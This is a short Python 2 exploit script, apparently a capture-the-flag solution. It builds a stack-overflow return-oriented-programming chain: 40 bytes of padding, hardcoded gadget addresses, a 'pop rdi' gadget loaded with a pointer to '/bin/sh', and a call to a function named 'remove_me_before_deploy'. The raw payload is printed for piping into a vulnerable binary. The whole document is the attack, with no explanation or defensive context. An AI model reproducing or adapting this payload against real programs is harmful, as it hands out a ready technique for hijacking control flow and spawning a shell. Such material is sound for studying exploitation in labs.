#/usr/bin/python
import struct

def p(x):
    return struct.pack('<L', x)

payload = ""
payload += "B" * 40
payload += p(0x400295) 		# ret
payload += "\x00\x00\x00\x00"
payload += p(0x4006d8) 		# pop ret
payload += "\x00\x00\x00\x00"
payload += "NEXTNEXT"
payload += p(0x400295) 		# ret
payload += "\x00\x00\x00\x00"
payload += p(0x4007bf) 		# pop rdi
payload += "\x00\x00\x00\x00"
payload += p(0x6010b1) 		# '/bin/sh'
payload += "\x00\x00\x00\x00"
payload += p(0x4007cc) 		# remove_me_before_deploy
payload += "\x00\x00\x00\x00"

print payload
